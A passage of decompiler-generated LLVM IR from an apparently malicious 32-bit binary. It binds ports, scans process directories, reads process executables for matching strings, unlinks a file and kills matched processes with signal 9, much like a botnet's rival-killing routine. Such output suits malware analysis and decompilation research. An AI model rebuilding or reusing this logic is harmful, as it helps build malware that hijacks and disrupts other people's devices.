  store i32 %v2_e810, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v6_e818 = call i32 @bind(i32 %v2_e810, %sockaddr* inttoptr (i32 16 to %sockaddr*), i32 16)
  %v0_e81c = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e824 = call i32 @listen(i32 %v0_e81c, i32 1)
  br label %dec_label_pc_e828

dec_label_pc_e828:                                ; preds = %dec_label_pc_e7f0, %dec_label_pc_e80c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e834 = call i32 @socket(i32 2, i32 1, i32 0)
  %v2_e838 = icmp eq i32 %v3_e834, -1
  store i32 %v3_e834, i32* @r4, align 4
  br i1 %v2_e838, label %dec_label_pc_e860.preheader, label %dec_label_pc_e844

dec_label_pc_e844:                                ; preds = %dec_label_pc_e828
  store i32 %v2_e848, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v6_e850 = call i32 @bind(i32 %v2_e848, %sockaddr* inttoptr (i32 16 to %sockaddr*), i32 16)
  %v0_e854 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e85c = call i32 @listen(i32 %v0_e854, i32 1)
  br label %dec_label_pc_e860.preheader

dec_label_pc_e860.preheader:                      ; preds = %dec_label_pc_e844, %dec_label_pc_e828
  %v0_e86053 = load i32, i32* @sb, align 4
  %v1_e86054 = inttoptr i32 %v0_e86053 to %__dirstream*
  %v3_e86455 = call %dirent* @readdir(%__dirstream* %v1_e86054)
  %v2_e86858 = icmp eq %dirent* %v3_e86455, null
  br i1 %v2_e86858, label %dec_label_pc_e8f0, label %dec_label_pc_e870.preheader

dec_label_pc_e870.preheader:                      ; preds = %dec_label_pc_e860.preheader, %dec_label_pc_e860.backedge
  %v0_e87067.in = phi %dirent* [ %v3_e864, %dec_label_pc_e860.backedge ], [ %v3_e86455, %dec_label_pc_e860.preheader ]
  %stack_var_-8480.159 = phi i32 [ %stack_var_-8480.1.be, %dec_label_pc_e860.backedge ], [ %stack_var_-8480.0, %dec_label_pc_e860.preheader ]
  br label %dec_label_pc_e870

dec_label_pc_e870:                                ; preds = %dec_label_pc_e870.preheader, %dec_label_pc_e8d8
  %v0_e880.in = phi %dirent* [ %v3_e8e4, %dec_label_pc_e8d8 ], [ %v0_e87067.in, %dec_label_pc_e870.preheader ]
  %stack_var_-8480.2 = phi i32 [ %v1_e894, %dec_label_pc_e8d8 ], [ %stack_var_-8480.159, %dec_label_pc_e870.preheader ]
  %v0_e880 = ptrtoint %dirent* %v0_e880.in to i32
  %v1_e870 = add i32 %v0_e880, 11
  %v2_e870 = inttoptr i32 %v1_e870 to i8*
  %v3_e870 = load i8, i8* %v2_e870, align 1
  %v4_e870 = zext i8 %v3_e870 to i32
  %v1_e874 = add nsw i32 %v4_e870, -48
  store i32 %v1_e874, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_e874, 9
  br i1 %tmp, label %dec_label_pc_e860.backedge, label %dec_label_pc_e880

dec_label_pc_e880:                                ; preds = %dec_label_pc_e870
  store i32 %v1_e870, i32* @r6, align 4
  %v4_e888 = call i32 @atoi(i8* %v2_e870)
  %v0_e890 = load i32, i32* @r8, align 4
  %v1_e894 = add i32 %stack_var_-8480.2, 1
  store i32 %v4_e888, i32* @r7, align 4
  %v5_e8a0 = icmp slt i32 %v0_e890, %v4_e888
  %v2_e900 = call i32 @time(i32* null)
  br i1 %v5_e8a0, label %dec_label_pc_e8fc, label %dec_label_pc_e8a4

dec_label_pc_e8a4:                                ; preds = %dec_label_pc_e880
  %v0_e8ac = load i32, i32* @r5, align 4
  %v2_e8ac = sub i32 %v2_e900, %v0_e8ac
  %v7_e8b4 = icmp slt i32 %v2_e8ac, 601
  br i1 %v7_e8b4, label %dec_label_pc_e8bc, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_e8a4
  store i32 400, i32* @r8, align 4
  br label %dec_label_pc_e860.backedge

dec_label_pc_e8bc:                                ; preds = %dec_label_pc_e8a4
  %v0_e8bc = load i32, i32* @r7, align 4
  %v7_e8c0 = icmp slt i32 %v0_e8bc, 401
  br i1 %v7_e8c0, label %dec_label_pc_e860.backedge, label %dec_label_pc_e8c4

dec_label_pc_e8c4:                                ; preds = %dec_label_pc_e8bc
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_e8cc = urem i32 %v1_e894, 10
  %v2_e8d0 = icmp eq i32 %v2_e8cc, 0
  br i1 %v2_e8d0, label %dec_label_pc_e8d8, label %dec_label_pc_e860.backedge

dec_label_pc_e8d8:                                ; preds = %dec_label_pc_e8c4
  %v1_e8dc = call i32 @sleep(i32 1)
  %v0_e8e0 = load i32, i32* @sb, align 4
  %v1_e8e0 = inttoptr i32 %v0_e8e0 to %__dirstream*
  %v3_e8e4 = call %dirent* @readdir(%__dirstream* %v1_e8e0)
  %v2_e8e8 = icmp eq %dirent* %v3_e8e4, null
  br i1 %v2_e8e8, label %dec_label_pc_e8f0, label %dec_label_pc_e870

dec_label_pc_e8f0:                                ; preds = %dec_label_pc_e860.backedge, %dec_label_pc_e8d8, %dec_label_pc_e860.preheader
  %stack_var_-8480.3 = phi i32 [ %stack_var_-8480.0, %dec_label_pc_e860.preheader ], [ %v1_e894, %dec_label_pc_e8d8 ], [ %stack_var_-8480.1.be, %dec_label_pc_e860.backedge ]
  %v0_e8f0 = load i32, i32* @sb, align 4
  %v1_e8f0 = inttoptr i32 %v0_e8f0 to %__dirstream*
  %v3_e8f4 = call i32 @closedir(%__dirstream* %v1_e8f0)
  br label %dec_label_pc_e5f8

dec_label_pc_e8fc:                                ; preds = %dec_label_pc_e880
  store i32 %v2_e900, i32* %stack_var_-8484, align 4
  %v1_e90c = call i32 @function_1134c(i32 13)
  %v1_e914 = call i32 @function_1134c(i32 14)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e920 = call i32 @function_11268(i32 13, i32* null)
  store i32 %v3_e920, i32* %r1.global-to-local, align 4
  store i32 %v2_e92c, i32* @r0, align 4
  %v3_e930 = call i32 @function_117c0(i8* %v2_e930, i32 %v3_e920)
  %v2_e93c = add i32 %v3_e930, %v2_e92c
  store i32 %v2_e93c, i32* %r5.global-to-local, align 4
  store i32 %v2_e93c, i32* @r0, align 4
  %v0_e944 = load i32, i32* @r6, align 4
  store i32 %v0_e944, i32* %r1.global-to-local, align 4
  %v2_e948 = inttoptr i32 %v2_e93c to i8*
  %v3_e948 = call i32 @function_117c0(i8* %v2_e948, i32 %v0_e944)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_e948, i32* %r4.global-to-local, align 4
  %v3_e958 = call i32 @function_11268(i32 14, i32* null)
  store i32 %v3_e958, i32* %r1.global-to-local, align 4
  %v0_e960 = load i32, i32* %r5.global-to-local, align 4
  %v2_e960 = add i32 %v3_e948, %v0_e960
  store i32 %v2_e960, i32* @r0, align 4
  %v2_e964 = inttoptr i32 %v2_e960 to i8*
  %v3_e964 = call i32 @function_117c0(i8* %v2_e964, i32 %v3_e958)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e970 = call i32 @function_11268(i32 13, i32* null)
  store i32 %v3_e970, i32* %r1.global-to-local, align 4
  store i32 %v2_e97c, i32* @r0, align 4
  %v3_e980 = call i32 @function_117c0(i8* %v2_e980, i32 %v3_e970)
  store i32 %v2_e97c, i32* %r2.global-to-local, align 4
  %v2_e98c = add i32 %v3_e980, %v2_e97c
  store i32 %v2_e98c, i32* @r5, align 4
  %v0_e990 = load i32, i32* @r6, align 4
  store i32 %v0_e990, i32* %r1.global-to-local, align 4
  store i32 %v2_e98c, i32* @r0, align 4
  %v2_e998 = inttoptr i32 %v2_e98c to i8*
  %v3_e998 = call i32 @function_117c0(i8* %v2_e998, i32 %v0_e990)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_e998, i32* @r4, align 4
  %v3_e9a8 = call i32 @function_11268(i32 29, i32* null)
  store i32 %v3_e9a8, i32* %r1.global-to-local, align 4
  %v0_e9b0 = load i32, i32* @r5, align 4
  %v1_e9b0 = load i32, i32* @r4, align 4
  %v2_e9b0 = add i32 %v1_e9b0, %v0_e9b0
  store i32 %v2_e9b0, i32* @r0, align 4
  %v2_e9b4 = inttoptr i32 %v2_e9b0 to i8*
  %v3_e9b4 = call i32 @function_117c0(i8* %v2_e9b4, i32 %v3_e9a8)
  %v1_e9bc = call i32 @function_11294(i32 13)
  %v1_e9c4 = call i32 @function_11294(i32 14)
  store i32 4095, i32* %r2.global-to-local, align 4
  store i32 %v2_e52c, i32* %r1.global-to-local, align 4
  %v7_e9dc = call i32 @readlink(i8* %v2_e930, i8* %v2_e538, i32 4095)
  %v2_e9e4 = icmp eq i32 %v7_e9dc, -1
  store i32 %v7_e9dc, i32* @r4, align 4
  store i32 -4344, i32* %r2.global-to-local, align 4
  br i1 %v2_e9e4, label %dec_label_pc_eaa8, label %dec_label_pc_e9f4

dec_label_pc_e9f4:                                ; preds = %dec_label_pc_e8fc
  %v2_e9f8 = add i32 %v7_e9dc, %v28_e49c
  store i32 %v2_e9f8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_ea00 = add i32 %v2_e9f8, -4344
  %v5_ea00 = inttoptr i32 %v4_ea00 to i8*
  store i8 0, i8* %v5_ea00, align 1
  %v1_ea08 = call i32 @function_1134c(i32 30)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ea14 = call i32 @function_11268(i32 30, i32* null)
  %v0_ea18 = load i32, i32* @r4, align 4
  %v1_ea18 = add i32 %v0_ea18, -1
  store i32 %v1_ea18, i32* @r1, align 4
  store i32 %v3_ea14, i32* %r2.global-to-local, align 4
  %v4_ea24 = call i32 @function_11aec(i8* %v2_e538, i32 %v1_ea18, i32 %v3_ea14)
  %v2_ea28 = icmp eq i32 %v4_ea24, -1
  br i1 %v2_ea28, label %dec_label_pc_ea44, label %dec_label_pc_ea30

dec_label_pc_ea30:                                ; preds = %dec_label_pc_e9f4
  %v3_ea34 = call i32 @unlink(i8* %v2_e538)
  %v0_ea38 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_ea40 = call i32 @kill(i32 %v0_ea38, i32 9)
  br label %dec_label_pc_ea44

dec_label_pc_ea44:                                ; preds = %dec_label_pc_e9f4, %dec_label_pc_ea30
  %v1_ea48 = call i32 @function_11294(i32 30)
  %v1_ea4c = call i32 @getpid()
  %v0_ea50 = load i32, i32* @r7, align 4
  %v9_ea50 = icmp eq i32 %v0_ea50, %v1_ea4c
  br i1 %v9_ea50, label %dec_label_pc_ea7c, label %dec_label_pc_ea58

dec_label_pc_ea58:                                ; preds = %dec_label_pc_ea44
  %v0_ea58 = call i32 @getppid()
  %v0_ea5c = load i32, i32* @r7, align 4
  %v9_ea5c = icmp eq i32 %v0_ea5c, %v0_ea58
  br i1 %v9_ea5c, label %dec_label_pc_ea7c, label %dec_label_pc_ea64

dec_label_pc_ea64:                                ; preds = %dec_label_pc_ea58
  store i32 ptrtoint (i8** @global_var_1a424.122 to i32), i32* %r2.global-to-local, align 4
  %v3_ea6c = load i8*, i8** @global_var_1a424.122, align 4
  %v4_ea6c = ptrtoint i8* %v3_ea6c to i32
  store i32 %v4_ea6c, i32* %r1.global-to-local, align 4
  %v6_ea70 = call i32 @function_11b78(i8* %v2_e538, i32 %v4_ea6c, i32 ptrtoint (i8** @global_var_1a424.122 to i32))
  %v2_ea74 = icmp eq i32 %v6_ea70, 0
  br i1 %v2_ea74, label %dec_label_pc_ea88, label %dec_label_pc_ea64.dec_label_pc_ea7c_crit_edge

dec_label_pc_ea64.dec_label_pc_ea7c_crit_edge:    ; preds = %dec_label_pc_ea64
  %v0_ea80.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ea7c

dec_label_pc_ea7c:                                ; preds = %dec_label_pc_ea64.dec_label_pc_ea7c_crit_edge, %dec_label_pc_ea58, %dec_label_pc_ea44
  %v0_ea80 = phi i32 [ %v0_ea80.pre, %dec_label_pc_ea64.dec_label_pc_ea7c_crit_edge ], [ %v0_ea58, %dec_label_pc_ea58 ], [ %v1_ea4c, %dec_label_pc_ea44 ]
  %v2_ea7c = load i32, i32* %stack_var_-8484, align 4
  store i32 %v2_ea7c, i32* @r5, align 4
  store i32 %v0_ea80, i32* @r8, align 4
  br label %dec_label_pc_e860.backedge

dec_label_pc_e860.backedge:                       ; preds = %dec_label_pc_e8c4, %dec_label_pc_e8bc, %dec_label_pc_e870, %dec_label_pc_ea7c, %dec_label_pc_ebd0, %.thread8
  %stack_var_-8480.1.be = phi i32 [ %v1_e894, %dec_label_pc_ebd0 ], [ %v1_e894, %dec_label_pc_ea7c ], [ %v1_e894, %.thread8 ], [ %stack_var_-8480.2, %dec_label_pc_e870 ], [ %v1_e894, %dec_label_pc_e8bc ], [ %v1_e894, %dec_label_pc_e8c4 ]
  %v0_e860 = load i32, i32* @sb, align 4
  %v1_e860 = inttoptr i32 %v0_e860 to %__dirstream*
  %v3_e864 = call %dirent* @readdir(%__dirstream* %v1_e860)
  %v2_e868 = icmp eq %dirent* %v3_e864, null
  br i1 %v2_e868, label %dec_label_pc_e8f0, label %dec_label_pc_e870.preheader

dec_label_pc_ea88:                                ; preds = %dec_label_pc_ea64
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_ea90 = call i32 (i8*, i32, ...) @open(i8* %v2_e538, i32 0)
  %v2_ea94 = icmp eq i32 %v4_ea90, -1
  store i32 %v4_ea90, i32* @r4, align 4
  br i1 %v2_ea94, label %dec_label_pc_ec68, label %dec_label_pc_eaa0

dec_label_pc_eaa0:                                ; preds = %dec_label_pc_ea88, %dec_label_pc_ec68
  %v0_eaa0 = phi i32 [ %v4_ea90, %dec_label_pc_ea88 ], [ %v0_eaa0.pre, %dec_label_pc_ec68 ]
  %v1_eaa4 = call i32 @close(i32 %v0_eaa0)
  br label %dec_label_pc_eaa8

dec_label_pc_eaa8:                                ; preds = %dec_label_pc_e8fc, %dec_label_pc_eaa0
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_eab4 = call i32 (i8*, i32, ...) @open(i8* %v2_e930, i32 0)
  %v2_eab8 = icmp eq i32 %v4_eab4, -1
  store i32 %v4_eab4, i32* %r8.global-to-local, align 4
  br i1 %v2_eab8, label %dec_label_pc_ebd0, label %dec_label_pc_eac4

dec_label_pc_eac4:                                ; preds = %dec_label_pc_eaa8
  %v1_eac8 = call i32 @function_1134c(i32 18)
  %v1_ead0 = call i32 @function_1134c(i32 19)
  store i32 %v2_ead8, i32* %r1.global-to-local, align 4
  %v3_eae0 = call i32 @function_11268(i32 18, i32* nonnull %stack_var_-40)
  store i32 %v3_eae0, i32* @r5, align 4
  store i32 %v2_eaec, i32* %r1.global-to-local, align 4
  %v3_eaf4 = call i32 @function_11268(i32 19, i32* nonnull %stack_var_-44)
  store i32 %v3_eaf4, i32* @r6, align 4
  %v0_eafc144 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_e5f0, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_eb08145 = call i32 @read(i32 %v0_eafc144, i32* nonnull %stack_var_-8476, i32 4096)
  %tmp136147 = icmp slt i32 %v4_eb08145, 1
  br i1 %tmp136147, label %dec_label_pc_ec4c, label %dec_label_pc_eb14

dec_label_pc_eb14:                                ; preds = %dec_label_pc_eac4, %dec_label_pc_eafc.backedge
  %v4_eb08148 = phi i32 [ %v4_eb08, %dec_label_pc_eafc.backedge ], [ %v4_eb08145, %dec_label_pc_eac4 ]
  store i32 %v2_e6dc, i32* %r3.global-to-local, align 4
  %v3_eb18 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_eb18, i32* @r4, align 4
  %v5_eb20 = icmp slt i32 %v4_eb08148, %v3_eb18
  br i1 %v5_eb20, label %dec_label_pc_eb30, label %dec_label_pc_eb84.lr.ph

dec_label_pc_eb84.lr.ph:                          ; preds = %dec_label_pc_eb14
  %v1_eb7c36 = add i32 %v4_eb08148, -1
  store i32 %v1_eb7c36, i32* %r1.global-to-local, align 4
  %v0_eb84.pre = load i32, i32* @r5, align 4
  %v1_eb88.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_eb84

dec_label_pc_eb30:                                ; preds = %dec_label_pc_eb7c.backedge, %dec_label_pc_eb14
  %v3_eb34 = load i32, i32* %stack_var_-44, align 4
  %v5_eb3c = icmp slt i32 %v4_eb08148, %v3_eb34
  br i1 %v5_eb3c, label %dec_label_pc_eafc.backedge, label %.thread22

.thread22:                                        ; preds = %dec_label_pc_eb30
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_eb4846 = icmp eq i32 %v4_eb08148, 0
  br i1 %v2_eb4846, label %dec_label_pc_eafc.backedge, label %dec_label_pc_eb50.lr.ph

dec_label_pc_eafc.backedge:                       ; preds = %dec_label_pc_eb68, %.thread22, %dec_label_pc_eb30
  %v0_eafc = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_e5f0, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_eb08 = call i32 @read(i32 %v0_eafc, i32* nonnull %stack_var_-8476, i32 4096)
  %tmp136 = icmp slt i32 %v4_eb08, 1
  br i1 %tmp136, label %dec_label_pc_ec4c, label %dec_label_pc_eb14

dec_label_pc_eb50.lr.ph:                          ; preds = %.thread22
  %v0_eb50.pre = load i32, i32* @r6, align 4
  %v1_eb54.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_eb50

dec_label_pc_eb50:                                ; preds = %dec_label_pc_eb68, %dec_label_pc_eb50.lr.ph
  %v0_eb48.in = phi i32 [ %v4_eb08148, %dec_label_pc_eb50.lr.ph ], [ %v0_eb48, %dec_label_pc_eb68 ]
  %v0_eb68 = phi i32 [ 0, %dec_label_pc_eb50.lr.ph ], [ %v1_eb68, %dec_label_pc_eb68 ]
  %v0_eb5c = phi i32 [ 0, %dec_label_pc_eb50.lr.ph ], [ %v1_eb5c., %dec_label_pc_eb68 ]
  %v0_eb48 = add i32 %v0_eb48.in, -1
  %v2_eb50 = add i32 %v0_eb5c, %v0_eb50.pre
  %v3_eb50 = inttoptr i32 %v2_eb50 to i8*
  %v4_eb50 = load i8, i8* %v3_eb50, align 1
  %v6_eb50 = zext i8 %v4_eb50 to i32
  store i32 %v6_eb50, i32* %r2.global-to-local, align 4
  %v2_eb54 = add i32 %v0_eb68, %v1_eb54.pre
  %v3_eb54 = inttoptr i32 %v2_eb54 to i8*
  %v4_eb54 = load i8, i8* %v3_eb54, align 1
  %v6_eb54 = zext i8 %v4_eb54 to i32
  store i32 %v6_eb54, i32* %r3.global-to-local, align 4
  %v9_eb58 = icmp eq i8 %v4_eb54, %v4_eb50
  %v1_eb5c = add i32 %v0_eb5c, 1
  %v1_eb5c. = select i1 %v9_eb58, i32 %v1_eb5c, i32 0
  store i32 %v1_eb5c., i32* %r1.global-to-local, align 4
  br i1 %v9_eb58, label %dec_label_pc_eba4, label %dec_label_pc_eb68

dec_label_pc_eb68:                                ; preds = %dec_label_pc_eba4, %dec_label_pc_eb50
  %v1_eb68 = add i32 %v0_eb68, 1
  %v2_eb48 = icmp eq i32 %v0_eb48, 0
  br i1 %v2_eb48, label %dec_label_pc_eafc.backedge, label %dec_label_pc_eb50

dec_label_pc_eb70:                                ; preds = %dec_label_pc_eb84
  %v9_eb70 = icmp eq i32 %v3_eb18, %v1_eb90.
  br i1 %v9_eb70, label %dec_label_pc_ebac, label %dec_label_pc_eb7c.backedge

dec_label_pc_eb7c.backedge:                       ; preds = %dec_label_pc_eb84, %dec_label_pc_eb70
  %storemerge = add i32 %storemerge.in, 1
  %v1_eb7c = add i32 %v0_eb7c, -1
  store i32 %v1_eb7c, i32* %r1.global-to-local, align 4
  %v2_eb7c = icmp eq i32 %v0_eb7c, 0
  br i1 %v2_eb7c, label %dec_label_pc_eb30, label %dec_label_pc_eb84

dec_label_pc_eb84:                                ; preds = %dec_label_pc_eb7c.backedge, %dec_label_pc_eb84.lr.ph
  %v0_eb7c = phi i32 [ %v1_eb7c36, %dec_label_pc_eb84.lr.ph ], [ %v1_eb7c, %dec_label_pc_eb7c.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_eb84.lr.ph ], [ %storemerge, %dec_label_pc_eb7c.backedge ]
  %v0_eb90 = phi i32 [ 0, %dec_label_pc_eb84.lr.ph ], [ %v1_eb90., %dec_label_pc_eb7c.backedge ]
  %v2_eb84 = add i32 %v0_eb90, %v0_eb84.pre
  %v3_eb84 = inttoptr i32 %v2_eb84 to i8*
  %v4_eb84 = load i8, i8* %v3_eb84, align 1
  %v6_eb84 = zext i8 %v4_eb84 to i32
  store i32 %v6_eb84, i32* %r2.global-to-local, align 4
  %v2_eb88 = add i32 %storemerge.in, %v1_eb88.pre
  %v3_eb88 = inttoptr i32 %v2_eb88 to i8*
  %v4_eb88 = load i8, i8* %v3_eb88, align 1
  %v6_eb88 = zext i8 %v4_eb88 to i32
  store i32 %v6_eb88, i32* %r3.global-to-local, align 4
  %v9_eb8c = icmp eq i8 %v4_eb88, %v4_eb84
  %v1_eb90 = add i32 %v0_eb90, 1
  %v1_eb90. = select i1 %v9_eb8c, i32 %v1_eb90, i32 0
  br i1 %v9_eb8c, label %dec_label_pc_eb70, label %dec_label_pc_eb7c.backedge

dec_label_pc_eba4:                                ; preds = %dec_label_pc_eb50
  %v9_eba4 = icmp eq i32 %v3_eb34, %v1_eb5c.
  br i1 %v9_eba4, label %dec_label_pc_ebac, label %dec_label_pc_eb68

dec_label_pc_ebac:                                ; preds = %dec_label_pc_eb70, %dec_label_pc_eba4
  %v1_ebb0 = call i32 @function_11294(i32 18)
  %v1_ebb8 = call i32 @function_11294(i32 19)
  %v0_ebbc = load i32, i32* %r8.global-to-local, align 4
  %v1_ebc0 = call i32 @close(i32 %v0_ebbc)
  %v0_ebc4 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_ebcc = call i32 @kill(i32 %v0_ebc4, i32 9)
  br label %dec_label_pc_ebd0

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_eaa8, %dec_label_pc_ec4c, %dec_label_pc_ebac
  store i32 64, i32* @r1, align 4
  store i32 %v2_e92c, i32* @r0, align 4
  %v0_ebdc = call i32 @function_11838()
  store i32 %v2_e97c, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_ebec = call i32 @function_11838()
  %v1_ebf4 = call i32 @sleep(i32 1)
  %v2_ebf8 = load i32, i32* %stack_var_-8484, align 4
  store i32 %v2_ebf8, i32* @r5, align 4
  %v0_ebfc = load i32, i32* @r7, align 4
  store i32 %v0_ebfc, i32* @r8, align 4
  br label %dec_label_pc_e860.backedge

dec_label_pc_ec04:                                ; preds = %dec_label_pc_e738
  %v1_ec0c = call i32 @function_df00(i32 42448)
  %v2_ec10 = icmp eq i32 %v1_ec0c, 0
  br i1 %v2_ec10, label %dec_label_pc_ec18, label %dec_label_pc_e748

dec_label_pc_ec18:                                ; preds = %dec_label_pc_ec04
  %v1_ec1c = call i32 @function_df00(i32 20480)
  %v2_ec20 = icmp eq i32 %v1_ec1c, 0
  br i1 %v2_ec20, label %dec_label_pc_ec28, label %dec_label_pc_e748

dec_label_pc_ec28:                                ; preds = %dec_label_pc_ec18
  %v1_ec30 = call i32 @function_df00(i32 add (i32 ptrtoint (i32* @global_var_8500.123 to i32), i32 206))
  %v2_ec34 = icmp eq i32 %v1_ec30, 0
  br i1 %v2_ec34, label %dec_label_pc_ec3c, label %dec_label_pc_e748

dec_label_pc_ec3c:                                ; preds = %dec_label_pc_ec28
  %v1_ec44 = call i32 @function_df00(i32 24465)
  br label %dec_label_pc_e748

dec_label_pc_ec4c:                                ; preds = %dec_label_pc_eafc.backedge, %dec_label_pc_eac4
  %v1_ec50 = call i32 @function_11294(i32 18)
  %v1_ec58 = call i32 @function_11294(i32 19)
  %v0_ec5c = load i32, i32* %r8.global-to-local, align 4
  %v1_ec60 = call i32 @close(i32 %v0_ec5c)
  br label %dec_label_pc_ebd0

dec_label_pc_ec68:                                ; preds = %dec_label_pc_ea88
  %v0_ec68 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_ec70 = call i32 @kill(i32 %v0_ec68, i32 9)
  %v0_eaa0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_eaa0

; uselistorder directives
  uselistorder i32 %v1_eb90., { 1, 0 }
  uselistorder i1 %v9_eb8c, { 1, 0 }
  uselistorder i32 %v0_eb90, { 1, 0 }
  uselistorder i32 %v1_eb5c., { 1, 2, 0 }
  uselistorder i1 %v9_eb58, { 1, 0 }
  uselistorder i32 %v0_eb5c, { 1, 0 }
  uselistorder i32 %v0_eb68, { 1, 0 }
  uselistorder i32 %v4_eb08, { 1, 0 }
  uselistorder i32 %v4_eb08148, { 0, 4, 3, 2, 1 }
  uselistorder %dirent* %v3_e864, { 1, 0 }
  uselistorder i32 %stack_var_-8480.1.be, { 1, 0 }
  uselistorder %dirent* %v3_e8e4, { 1, 0 }
  uselistorder i32 %v1_e894, { 0, 1, 5, 4, 3, 2, 7, 6 }
  uselistorder i32 %v4_e888, { 1, 0 }
  uselistorder i32 %v5_e60c, { 1, 0 }
  uselistorder i32 %stack_var_-8480.0, { 1, 0 }
  uselistorder i32 %v2_e97c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e92c, { 1, 0, 2 }
  uselistorder i32 %v2_e5f0, { 1, 0, 2 }
  uselistorder i8* %v2_e538, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 %storemerge87, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8476, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 7, 59, 60, 5, 6, 8, 10, 11, 12, 14, 13, 15, 16, 18, 17, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 48, 46, 47, 9, 49, 50, 51, 52, 54, 53, 55, 56, 57, 58 }
  uselistorder i32 64, { 9, 10, 11, 12, 7, 13, 14, 15, 0, 16, 17, 18, 1, 19, 20, 21, 2, 22, 23, 24, 8, 25, 26, 27, 3, 28, 29, 30, 31, 32, 4, 33, 34, 35, 36, 37, 5, 38, 39, 40, 41, 6, 42 }
  uselistorder i32 (i32, i32)* @kill, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_11aec, { 0, 2, 1, 3 }
  uselistorder i32 (%__dirstream*)* @closedir, { 1, 2, 0, 3 }
  uselistorder %dirent* null, { 4, 3, 1, 5, 6, 7, 0, 8, 2 }
  uselistorder %dirent* (%__dirstream*)* @readdir, { 4, 3, 1, 6, 7, 5, 0, 8, 2, 9 }
  uselistorder %__dirstream* (i8*)* @opendir, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i8*, i32)* @readlink, { 2, 3, 1, 0, 4 }
  uselistorder i8** @global_var_1a424.122, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1a424.122 to i32), { 0, 3, 2, 1 }
  uselistorder i32 4096, { 5, 9, 0, 1, 6, 10, 7, 11, 2, 8, 3, 4 }
  uselistorder label %dec_label_pc_ebd0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ebac, { 1, 0 }
  uselistorder label %dec_label_pc_eb14, { 1, 0 }
  uselistorder label %dec_label_pc_eaa8, { 1, 0 }
  uselistorder label %dec_label_pc_eaa0, { 1, 0 }
  uselistorder label %dec_label_pc_e860.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_ea44, { 1, 0 }
  uselistorder label %dec_label_pc_e870, { 1, 0 }
  uselistorder label %dec_label_pc_e870.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e828, { 1, 0 }
  uselistorder label %dec_label_pc_e7f0, { 1, 0 }
  uselistorder label %dec_label_pc_e7b8, { 1, 0 }
  uselistorder label %dec_label_pc_e780, { 1, 0 }
  uselistorder label %dec_label_pc_e748, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_e738, { 1, 0 }
  uselistorder label %bb135, { 1, 0 }
}

define i32 @function_ec84(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ec84:
  store i32 ptrtoint (i32* @global_var_ee0c.125 to i32), i32* @global_var_1a39c.127, align 4
  ret i32 %arg1
}

define i32 @function_ec9c(i32 %arg1) local_unnamed_addr {
dec_label_pc_ec9c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_ec9c = load i32, i32* @r4, align 4
  %v9_ec9c = load i32, i32* @r6, align 4
  %v12_ec9c = load i32, i32* @r7, align 4
  %v15_ec9c = load i32, i32* @r8, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_ecb8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_1a394.129 to i32), i32* @r6, align 4
